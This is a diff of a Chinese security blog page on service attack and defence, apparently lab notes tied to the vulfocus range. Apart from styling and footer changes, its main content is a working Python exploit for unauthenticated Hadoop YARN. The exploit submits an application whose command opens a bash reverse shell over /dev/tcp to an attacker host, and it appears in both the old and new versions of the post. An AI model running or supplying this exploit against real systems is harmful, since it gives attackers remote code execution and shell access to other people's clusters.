@@ -16,12 +16,12 @@
   <meta name="author" content="D4wn">
   <meta name="keywords" content="服务攻防,数据库安全,Redis，Hadoop,Mysql,未授权访问,RCE">
   
-    <meta name="description" content="服务攻防前置知识服务攻防大致流程：     服务开放了 扫描到的端口没开放:  端口修改了 只能内网访问 防护应用  Hadoop靶场:https:&#x2F;&#x2F;vulfocus.cn 123456789101112131415161718192021222324import requests# Hadoop未授权访问exp# --------------------------设置参数----------">
+    <meta name="description" content="服务攻防 前置知识 服务攻防大致流程：   image  服务开放了 扫描到的端口没开放:  端口修改了 只能内网访问 防护应用  Hadoop 靶场:https:&#x2F;&#x2F;vulfocus.cn 123456789101112131415161718192021222324import requests# Hadoop未授权访问exp# -----------------">
 <meta property="og:type" content="article">
 <meta property="og:title" content="服务攻防">
 <meta property="og:url" content="https://d4wnnn.github.io/2022/10/02/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/index.html">
 <meta property="og:site_name" content="D4wn">
-<meta property="og:description" content="服务攻防前置知识服务攻防大致流程：     服务开放了 扫描到的端口没开放:  端口修改了 只能内网访问 防护应用  Hadoop靶场:https:&#x2F;&#x2F;vulfocus.cn 123456789101112131415161718192021222324import requests# Hadoop未授权访问exp# --------------------------设置参数----------">
+<meta property="og:description" content="服务攻防 前置知识 服务攻防大致流程：   image  服务开放了 扫描到的端口没开放:  端口修改了 只能内网访问 防护应用  Hadoop 靶场:https:&#x2F;&#x2F;vulfocus.cn 123456789101112131415161718192021222324import requests# Hadoop未授权访问exp# -----------------">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://source.unsplash.com/user/erondu/1600x900">
 <meta property="article:published_time" content="2022-10-02T08:52:50.000Z">
@@ -124,7 +124,123 @@
 
 
   
-<meta name="generator" content="Hexo 6.3.0"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
 
 
 <body>
@@ -266,7 +382,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1k 字
+          842 字
         
       </span>
     
@@ -277,7 +393,7 @@
         
         
         
-          9 分钟
+          8 分钟
         
       </span>
     
@@ -320,19 +436,26 @@
             
               <div class="markdown-body">
                 
-                <h1 id="服务攻防"><a href="#服务攻防" class="headerlink" title="服务攻防"></a>服务攻防</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>服务攻防大致流程：</p>
-<p><img src="/2022/10/02/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image.png" srcset="/img/loading.gif" lazyload alt="image"></p>
-<p>   服务开放了 扫描到的端口没开放:</p>
-<ol>
+                <h1 id="服务攻防">服务攻防</h1>
+<h2 id="前置知识">前置知识</h2>
+<p>服务攻防大致流程：</p>
+<figure>
+<img src="/2022/10/02/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image.png" srcset="/img/loading.gif" lazyload alt="image">
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<p>服务开放了 扫描到的端口没开放:</p>
+<ol type="1">
 <li>端口修改了</li>
 <li>只能内网访问</li>
 <li>防护应用</li>
 </ol>
-<h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><p>靶场:<a target="_blank" rel="noopener" href="https://vulfocus.cn/">https://vulfocus.cn</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># Hadoop未授权访问exp</span><br><br><span class="hljs-comment"># --------------------------设置参数-----------------------------------------------------------------------------</span><br>target = <span class="hljs-string">&#x27;http://172.30.158.168:8088/&#x27;</span>  <span class="hljs-comment"># 靶机</span><br>lhost = <span class="hljs-string">&#x27;120.53.236.54&#x27;</span>  <span class="hljs-comment"># 攻击机</span><br>port = <span class="hljs-string">&#x27;8999&#x27;</span>  <span class="hljs-comment"># 监听shell端口</span><br><span class="hljs-comment"># -------------------------------------------------------------------------------------------------------</span><br>url = target + <span class="hljs-string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span><br>resp = requests.post(url)<br>app_id = resp.json()[<span class="hljs-string">&#x27;application-id&#x27;</span>]<br>url = target + <span class="hljs-string">&#x27;ws/v1/cluster/apps&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;application-id&#x27;</span>: app_id,<br>    <span class="hljs-string">&#x27;application-name&#x27;</span>: <span class="hljs-string">&#x27;get-shell&#x27;</span>,<br>    <span class="hljs-string">&#x27;am-container-spec&#x27;</span>: &#123;<br>        <span class="hljs-string">&#x27;commands&#x27;</span>: &#123;<br>            <span class="hljs-string">f&#x27;command&#x27;</span>: <span class="hljs-string">f&#x27;/bin/bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">&#123;lhost&#125;</span>/<span class="hljs-subst">&#123;port&#125;</span> 0&gt;&amp;1&#x27;</span>,<br>        &#125;,<br>    &#125;,<br>    <span class="hljs-string">&#x27;application-type&#x27;</span>: <span class="hljs-string">&#x27;YARN&#x27;</span>,<br>&#125;<br>requests.post(url, json=data)<br></code></pre></td></tr></table></figure>
-
-<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p> 详见博客内Redis漏洞专题</p>
-<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>详见博客内MySQL漏洞专题</p>
+<h2 id="hadoop">Hadoop</h2>
+<p>靶场:https://vulfocus.cn</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># Hadoop未授权访问exp</span><br><br><span class="hljs-comment"># --------------------------设置参数-----------------------------------------------------------------------------</span><br>target = <span class="hljs-string">'http://172.30.158.168:8088/'</span>  <span class="hljs-comment"># 靶机</span><br>lhost = <span class="hljs-string">'120.53.236.54'</span>  <span class="hljs-comment"># 攻击机</span><br>port = <span class="hljs-string">'8999'</span>  <span class="hljs-comment"># 监听shell端口</span><br><span class="hljs-comment"># -------------------------------------------------------------------------------------------------------</span><br>url = target + <span class="hljs-string">'ws/v1/cluster/apps/new-application'</span><br>resp = requests.post(url)<br>app_id = resp.json()[<span class="hljs-string">'application-id'</span>]<br>url = target + <span class="hljs-string">'ws/v1/cluster/apps'</span><br>data = {<br>    <span class="hljs-string">'application-id'</span>: app_id,<br>    <span class="hljs-string">'application-name'</span>: <span class="hljs-string">'get-shell'</span>,<br>    <span class="hljs-string">'am-container-spec'</span>: {<br>        <span class="hljs-string">'commands'</span>: {<br>            <span class="hljs-string">f'command'</span>: <span class="hljs-string">f'/bin/bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">{lhost}</span>/<span class="hljs-subst">{port}</span> 0&gt;&amp;1'</span>,<br>        },<br>    },<br>    <span class="hljs-string">'application-type'</span>: <span class="hljs-string">'YARN'</span>,<br>}<br>requests.post(url, json=data)<br></code></pre></td></tr></table></figure>
+<h2 id="redis">Redis</h2>
+<p>详见博客内Redis漏洞专题</p>
+<h2 id="mysql">MySQL</h2>
+<p>详见博客内MySQL漏洞专题</p>
 
                 
               </div>
@@ -610,6 +733,11 @@
   
   
   
+  <!-- 又拍云 -->
+  <div>
+    <a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral">本网站由
+        <img src="img/又拍云_logo5.png" srcset="/img/loading.gif" lazyload width="45px" /> 提供CDN加速/云存储服务</a>
+ </div>
 </div>
 
   </footer>
